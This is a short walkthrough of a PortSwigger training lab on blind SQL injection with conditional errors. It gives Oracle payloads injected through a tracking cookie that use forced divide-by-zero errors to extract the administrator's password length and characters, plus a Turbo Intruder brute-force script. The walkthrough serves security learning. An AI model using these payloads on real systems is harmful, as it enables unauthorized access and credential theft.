# Lab8: Blind SQL injection with conditional errors
url: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

# Overvỉew:
- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

- The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

- The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

-To solve the lab, log in as the administrator user.

# Explained:
- First, modify the cookie like cookie: xyz' (add a single quotation mark). Then the server response error (500). Change it to two quotation marks, then error disappears.
-> This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response
- Now we need to confirm that the server is interpreting injection as a SQL query. First need to construct a subquery using a valid SQL syntax. Try submit:
    TrackingId: xyz'||(SELECT '')||'
But its still invalid maybe because of database type, try specify the syntax
    TrackingId: xyz'||(SELECT '' FROM dual)||'
-> The target is using Oracle database
- Submit : TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
to get the valid table
- TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
to get valid table name
- TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
to get the length of password
- TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,a,1)='b' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
to get the valid password. Use Burp Intruder to iterator a(Password length) and b(a-z,0-9)

# Turbo Intruder Script:
    def queueRequests(target, wordlists):
        engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=3,
        requestsPerConnection=10,
        pipeline=False
    )

    passwords = "qwertyuiopasdfghjklzxcvbnm1234567890"

    for loop in range(1,21):
        for pwd in passwords:
            engine.queue(target.req, [loop, pwd])

    def handleResponse(req, interesting):
        table.add(req)